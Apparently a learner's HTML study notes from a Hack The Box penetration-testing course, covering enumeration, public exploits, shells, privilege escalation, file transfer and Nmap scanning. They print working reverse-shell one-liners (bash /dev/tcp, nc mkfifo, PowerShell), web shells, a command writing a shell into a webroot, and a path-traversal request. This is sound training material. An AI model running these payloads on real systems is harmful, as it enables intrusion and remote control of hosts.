<h2 id="gobuster">Gobuster</h2>

<p>After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as <a href="https://github.com/ffuf/ffuf">ffuf</a> or <a href="https://github.com/OJ/gobuster">GoBuster</a> to perform this directory enumeration. Sometimes we will find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access the web application or even remote code execution on the web server itself.</p>

<p>GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. For this module’s purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch <code class="language-plaintext highlighter-rouge">dir</code>. Let us run a simple scan using the <code class="language-plaintext highlighter-rouge">dirb</code> <code class="language-plaintext highlighter-rouge">common.txt</code> wordlist.</p>

<p>nb: Seclist can be installed with <strong><code class="language-plaintext highlighter-rouge">sudo apt install seclists -y</code></strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> IP <span class="nt">-w</span> /home/nullbyte/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.10.10.121/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/12/11 21:47:25 Starting gobuster
<span class="o">===============================================================</span>
/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
/wordpress <span class="o">(</span>Status: 301<span class="o">)</span>
</code></pre></div></div>

<p>#bannergrabing  #whatweb</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
c0derpwner@htb[/htb]<span class="nv">$ </span>curl <span class="nt">-IL</span> https://www.example.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2024 22:24:05 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>   <span class="nt">--</span><span class="o">&gt;</span>  OUT WE EXPECT
</code></pre></div></div>

<hr />

<h1 id="public-exploits">Public Exploits</h1>

<p>Once we identify the services running on ports identified from our <code class="language-plaintext highlighter-rouge">Nmap</code> scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like <code class="language-plaintext highlighter-rouge">SSH</code> or <code class="language-plaintext highlighter-rouge">ftp</code>.</p>

<p>// Finding Public Exploits</p>

<p><strong>Many tools</strong> can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to <strong>Google</strong> for the application name with <code class="language-plaintext highlighter-rouge">exploit</code> to see if we get any results:</p>

<p>![[google_smb.jpg]]</p>

<p>A well-known tool for this purpose is <strong><code class="language-plaintext highlighter-rouge">searchsploit</code></strong>, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command</p>

<p>Example of the HTB was to find a particular <strong>SimpleBackup</strong> file read in a <strong><code class="language-plaintext highlighter-rouge">Wordpress</code></strong> plugin and the exploit worked with payload /flag.txt</p>

<p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>curl <span class="s1">'http://94.237.55.96:40307/wp-admin/tools.php?page=backup_manager&amp;download_backup_file=../../../../../flag.txt'</span>     
HTB<span class="o">{</span>my_f1r57_h4ck<span class="o">}</span>
</code></pre></div></div>

<hr />

<h1 id="types-of-shells">Types of Shells</h1>

<p>Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system’s shell, i.e., <code class="language-plaintext highlighter-rouge">Bash</code> or <code class="language-plaintext highlighter-rouge">PowerShell</code>, so we can thoroughly investigate the remote system for our next move.</p>

<p>One way to connect to a compromised system is through network protocols, like <code class="language-plaintext highlighter-rouge">SSH</code> for Linux or <code class="language-plaintext highlighter-rouge">WinRM</code> for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.</p>

<p>The other method of accessing a compromised host for control and remote code execution is through shells.<br />
As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.</p>

<table>
  <thead>
    <tr>
      <th>Type of Shell</th>
      <th>Method of Communication</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Reverse Shell</code></td>
      <td>Connects back to our system and gives us control through a reverse connection.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Bind Shell</code></td>
      <td>Waits for us to connect to it and gives us control once we do.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Web Shell</code></td>
      <td>Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.</td>
    </tr>
  </tbody>
</table>

<p>Let us dive more deeply into each of the above shells and walk through examples of each.</p>

<h2 id="reverse-shell">Reverse Shell</h2>

<p>A <code class="language-plaintext highlighter-rouge">Reverse Shell</code> is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a <code class="language-plaintext highlighter-rouge">netcat</code> listener on our machine that listens on a specific port, say port <code class="language-plaintext highlighter-rouge">1234</code>. With this listener in place, we can execute a <code class="language-plaintext highlighter-rouge">reverse shell command</code> that connects the remote systems shell, i.e., <code class="language-plaintext highlighter-rouge">Bash</code> or <code class="language-plaintext highlighter-rouge">PowerShell</code> to our <code class="language-plaintext highlighter-rouge">netcat</code> listener, which gives us a reverse connection over the remote system.</p>

<h3 id="possible-payloads">Possible payloads</h3>

<p>#reverseshell #payloadrs #shell</p>

<p>simple bash:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</span>
</code></pre></div></div>

<p>mkfifo bash:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 1234 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<p>mkfifo bind shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/bash <span class="nt">-i</span> 2&gt;&amp;1|nc <span class="nt">-lvp</span> 1234 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<p>powershell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
powershell <span class="nt">-nop</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);</span><span class="nv">$s</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$b</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$s</span><span class="s2">.Read(</span><span class="nv">$b</span><span class="s2">, 0, </span><span class="nv">$b</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$b</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sb</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sb2</span><span class="s2"> = </span><span class="nv">$sb</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sbt</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sb2</span><span class="s2">);</span><span class="nv">$s</span><span class="s2">.Write(</span><span class="nv">$sbt</span><span class="s2">,0,</span><span class="nv">$sbt</span><span class="s2">.Length);</span><span class="nv">$s</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span>

</code></pre></div></div>

<p>spanw in extra env :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div></div>

<p>After we run this command, we will hit <code class="language-plaintext highlighter-rouge">ctrl+z</code> to background our shell and get back on our local terminal, and input the following <code class="language-plaintext highlighter-rouge">stty</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@remotehost<span class="nv">$ </span>^Z

c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">fg</span>

<span class="o">[</span>Enter]
<span class="o">[</span>Enter]
www-data@remotehost<span class="nv">$ </span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h4 id="writing-a-web-shell">Writing a Web Shell</h4>

<p>First of all, we need to write our web shell that would take our command through a <code class="language-plaintext highlighter-rouge">GET</code> request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:</p>

<p>Code: php</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Code: jsp</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span> <span class="nt">%&gt;</span>
</code></pre></div></div>

<p>Code: asp</p>

<pre><code class="language-asp">&lt;% eval request("cmd") %&gt;
</code></pre>

<h4 id="uploading-a-web-shell">Uploading a Web Shell</h4>

<p>Once we have our web shell, we need to place our web shell script into the remote host’s web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. <code class="language-plaintext highlighter-rouge">shell.php</code> and upload it, and then access our uploaded file to execute commands.</p>

<p>However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:</p>

<table>
  <thead>
    <tr>
      <th>Web Server</th>
      <th>Default Webroot</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Apache</code></td>
      <td>/var/www/html/</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Nginx</code></td>
      <td>/usr/local/nginx/html/</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">IIS</code></td>
      <td>c:\inetpub\wwwroot|</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">XAMPP</code></td>
      <td>C:\xampp\htdocs|</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>We can check these directories to see which webroot is in use and then use <code class="language-plaintext highlighter-rouge">echo</code> to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a <code class="language-plaintext highlighter-rouge">PHP</code> shell with the following command:</p>

<p>Code: bash</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> /var/www/html/shell.php
</code></pre></div></div>

<hr />

<h4 id="accessing-web-shell">Accessing Web Shell</h4>

<p>Once we write our web shell, we can either access it through a browser or by using <code class="language-plaintext highlighter-rouge">cURL</code>. We can visit the <code class="language-plaintext highlighter-rouge">shell.php</code> page on the compromised website, and use <code class="language-plaintext highlighter-rouge">?cmd=id</code> to execute the <code class="language-plaintext highlighter-rouge">id</code> command:</p>

<p><img src="https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png" alt="" /></p>

<p>Another option is to use <code class="language-plaintext highlighter-rouge">cURL</code>:</p>

<p>Types of Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>curl http://SERVER_IP:PORT/shell.php?cmd<span class="o">=</span><span class="nb">id

</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on <code class="language-plaintext highlighter-rouge">80</code> or <code class="language-plaintext highlighter-rouge">443</code>, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.</p>

<p>On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a <code class="language-plaintext highlighter-rouge">Python</code> script to automate this process and give us a semi-interactive web shell right within our terminal.</p>

<hr />

<h1 id="privilege-escalation">Privilege Escalation</h1>

<hr />

<p>Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the <code class="language-plaintext highlighter-rouge">root</code> user on <code class="language-plaintext highlighter-rouge">Linux</code> or the <code class="language-plaintext highlighter-rouge">administrator</code>/<code class="language-plaintext highlighter-rouge">SYSTEM</code> user on <code class="language-plaintext highlighter-rouge">Windows</code>. Let us walk through some common methods of escalating our privileges.</p>

<p>https://gtfobins.github.io/</p>

<h2 id="enumeration-scripts">Enumeration Scripts</h2>

<p>Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include <a href="https://github.com/rebootuser/LinEnum.git">LinEnum</a> and <a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a>, and for Windows include <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> and <a href="https://github.com/411Hall/JAWS">JAWS</a>.</p>

<p>Another useful tool we may use for server enumeration is the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Privilege Escalation Awesome Scripts SUITE (PEASS)</a>, as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.</p>

<h2 id="kernel-exploits">Kernel Exploits</h2>

<p>Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.</p>

<p>For example, the above script showed us the Linux version to be <code class="language-plaintext highlighter-rouge">3.9.0-73-generic</code>. If we Google exploits for this version or use <code class="language-plaintext highlighter-rouge">searchsploit</code>, we would find a <code class="language-plaintext highlighter-rouge">CVE-2016-5195</code>, otherwise known as <code class="language-plaintext highlighter-rouge">DirtyCow</code>. We can search for and download the <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">DirtyCow</a> exploit and run it on the server to gain root access.</p>

<p>The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.</p>

<hr />

<h2 id="vulnerable-software">Vulnerable Software</h2>

<p>Another thing we should look for is installed software. For example, we can use the <code class="language-plaintext highlighter-rouge">dpkg -l</code> command on Linux or look at <code class="language-plaintext highlighter-rouge">C:\Program Files</code> in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.</p>

<hr />

<h2 id="user-privileges">User Privileges</h2>

<p>Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:</p>

<ol>
  <li>Sudo</li>
  <li>SUID</li>
  <li>Windows Token Privileges</li>
</ol>

<p>The <code class="language-plaintext highlighter-rouge">sudo</code> command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root ‘like <code class="language-plaintext highlighter-rouge">tcpdump</code>’ or allow the user to access certain root-only directories. We can check what <code class="language-plaintext highlighter-rouge">sudo</code> privileges we have with the <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/user2<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>  
Matching Defaults entries <span class="k">for </span>user1 on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin  
  
User user1 may run the following commands on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   <span class="o">(</span>user2 : user2<span class="o">)</span> NOPASSWD: /bin/bash  
user1@ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:/home/user2<span class="err">$</span>
</code></pre></div></div>
<p>as you can see there’s sudo user2 bash possibility to read flag on his <code class="language-plaintext highlighter-rouge">/home/user2</code></p>

<hr />

<h1 id="transferring-files">Transferring Files</h1>

<p>During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the <code class="language-plaintext highlighter-rouge">Upload</code> command to upload a file, we need to learn methods to transfer files with a standard reverse shell.</p>

<h2 id="wget">Wget</h2>

<p>There are many methods to accomplish this. One method is running a <a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server">Python HTTP server</a> on our machine and then using <code class="language-plaintext highlighter-rouge">wget</code> or <code class="language-plaintext highlighter-rouge">cURL</code> to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">cd</span> /tmp
c0derpwner@htb[/htb]<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000

Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div>

<p>Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@remotehost<span class="nv">$ </span>wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: <span class="s1">'linenum.sh'</span>

linenum.sh 100%[<span class="o">==============================================&gt;]</span> 144.86K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.02s

2021-02-08 18:09:19 <span class="o">(</span>8.16 MB/s<span class="o">)</span> - <span class="s1">'linenum.sh'</span> saved <span class="o">[</span>14337/14337]
</code></pre></div></div>

<p>Note that we used our IP <code class="language-plaintext highlighter-rouge">10.10.14.1</code> and the port our Python server runs on <code class="language-plaintext highlighter-rouge">8000</code>. If the remote server does not have <code class="language-plaintext highlighter-rouge">wget</code>, we can use <code class="language-plaintext highlighter-rouge">cURL</code> to download the file:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@remotehost<span class="nv">$ </span>curl http://10.10.14.1:8000/linenum.sh <span class="nt">-o</span> linenum.sh

100  144k  100  144k    0     0  176k      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 176k
</code></pre></div></div>

<p>Note that we used the <code class="language-plaintext highlighter-rouge">-o</code> flag to specify the output file name.</p>

<hr />

<h2 id="using-scp">Using SCP</h2>

<p>Another method to transfer files would be using <code class="language-plaintext highlighter-rouge">scp</code>, granted we have obtained ssh user credentials on the remote host. We can do so as follows:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost<span class="s1">'s password: *********
linenum.sh
</span></code></pre></div></div>

<p>Note that we specified the local file name after <code class="language-plaintext highlighter-rouge">scp</code>, and the remote directory will be saved to after the <code class="language-plaintext highlighter-rouge">:</code>.</p>

<hr />

<h2 id="using-base64">Using Base64</h2>

<p>In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to <a href="https://linux.die.net/man/1/base64">base64</a> encode the file into <code class="language-plaintext highlighter-rouge">base64</code> format, and then we can paste the <code class="language-plaintext highlighter-rouge">base64</code> string on the remote server and decode it. For example, if we wanted to transfer a binary file called <code class="language-plaintext highlighter-rouge">shell</code>, we can <code class="language-plaintext highlighter-rouge">base64</code> encode it as follows:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">base64 </span>shell <span class="nt">-w0</span>

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
</code></pre></div></div>

<p>Now, we can copy this <code class="language-plaintext highlighter-rouge">base64</code> string, go to the remote host, and use <code class="language-plaintext highlighter-rouge">base64 -d</code> to decode it, and pipe the output into a file:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@remotehost<span class="nv">$ </span><span class="nb">echo </span>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> shell
</code></pre></div></div>

<hr />

<h2 id="validating-file-transfers">Validating File Transfers</h2>

<p>To validate the format of a file, we can run the <a href="https://linux.die.net/man/1/file">file</a> command on it:</p>

<p>Transferring Files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@remotehost<span class="nv">$ </span>file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, no section header
</code></pre></div></div>

<p>As we can see, when we run the <code class="language-plaintext highlighter-rouge">file</code> command on the <code class="language-plaintext highlighter-rouge">shell</code> file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run <code class="language-plaintext highlighter-rouge">md5sum</code> on it:</p>

<hr />

<h1 id="nmap-enumeration">Nmap Enumeration</h1>

<p>Nmap offers many different scanning techniques, making different types of connections and using differently structured packets to send. Here we can see all the scanning techniques Nmap offers:</p>

<p>If our target sends a <code class="language-plaintext highlighter-rouge">SYN-ACK</code> flagged packet back to us, Nmap detects that the port is <code class="language-plaintext highlighter-rouge">open</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> localhost

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-06-11 22:50 UTC
Nmap scan report <span class="k">for </span>localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
Host is up <span class="o">(</span>0.000010s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
5901/tcp open  vnc-1

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.18 seconds
</code></pre></div></div>

<p>| <strong>Scanning Options</strong> | <strong>Description</strong>                                                          |
| ——————– | ———————————————————————— |
| <code class="language-plaintext highlighter-rouge">10.129.2.0/24</code>      | Target network range.                                                    |
| <code class="language-plaintext highlighter-rouge">-sn</code>                | Disables port scanning.                                                  |
| <code class="language-plaintext highlighter-rouge">-oA tnet</code>           | Stores the results in all formats starting with the name ‘tnet’.         |
| -<code class="language-plaintext highlighter-rouge">PE</code>                | Performs the ping scan by using ‘ICMP Echo requests’ against the target. |
This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not. We will take a closer look at these techniques in “<code class="language-plaintext highlighter-rouge">Firewall and IDS Evasion</code>”.</p>

<p>By default, <code class="language-plaintext highlighter-rouge">Nmap</code> scans the top 1000 TCP ports with the SYN scan (<code class="language-plaintext highlighter-rouge">-sS</code>). This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (<code class="language-plaintext highlighter-rouge">-sT</code>) is performed by default. This means that if we do not define ports and scanning methods, these parameters are set automatically. We can define the ports one by one (<code class="language-plaintext highlighter-rouge">-p 22,25,80,139,445</code>), by range (<code class="language-plaintext highlighter-rouge">-p 22-445</code>), by top ports (<code class="language-plaintext highlighter-rouge">--top-ports=10</code>) from the <code class="language-plaintext highlighter-rouge">Nmap</code> database that have been signed as most frequent, by scanning all ports (<code class="language-plaintext highlighter-rouge">-p-</code>) but also by defining a fast port scan, which contains top 100 ports (<code class="language-plaintext highlighter-rouge">-F</code>).</p>

<h2 id="discovering-open-udp-ports">Discovering Open UDP Ports</h2>

<p>Some system administrators sometimes forget to filter the UDP ports in addition to the TCP ones. Since <code class="language-plaintext highlighter-rouge">UDP</code> is a <code class="language-plaintext highlighter-rouge">stateless protocol</code> and does not require a three-way handshake like TCP. We do not receive any acknowledgment. Consequently, the timeout is much longer, making the whole <code class="language-plaintext highlighter-rouge">UDP scan</code> (<code class="language-plaintext highlighter-rouge">-sU</code>) much slower than the <code class="language-plaintext highlighter-rouge">TCP scan</code> (<code class="language-plaintext highlighter-rouge">-sS</code>).</p>

<p>Let’s look at an example of what a UDP scan (<code class="language-plaintext highlighter-rouge">-sU</code>) can look like and what results it gives us.</p>

<h4 id="udp-port-scan">UDP Port Scan</h4>

<p>Host and Port Scanning</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap 10.129.2.28 <span class="nt">-F</span> <span class="nt">-sU</span>

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-06-15 16:01 CEST
Nmap scan report <span class="k">for </span>10.129.2.28
Host is up <span class="o">(</span>0.059s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 95 closed ports
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
631/udp  open|filtered ipp
5353/udp open          zeroconf
MAC Address: DE:AD:00:00:BE:EF <span class="o">(</span>Intel Corporate<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>98.07 seconds
</code></pre></div></div>
<p>|<strong>Scanning Options</strong>|<strong>Description</strong>|
|—|—|
|<code class="language-plaintext highlighter-rouge">10.129.2.28</code>|Scans the specified target.|
|<code class="language-plaintext highlighter-rouge">-F</code>|Scans top 100 ports.|
|<code class="language-plaintext highlighter-rouge">-sU</code>|Performs a UDP scan.|</p>

<table>
  <thead>
    <tr>
      <th><strong>Scanning Options</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">10.129.2.28</code></td>
      <td>Scans the specified target.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
      <td>Scans all ports.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-oA target</code></td>
      <td>Saves the results in all formats, starting the name of each file with ‘target’.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">--stats-every=5s</code></td>
      <td>Shows the progress of the scan every 5 seconds.</td>
    </tr>
    <tr>
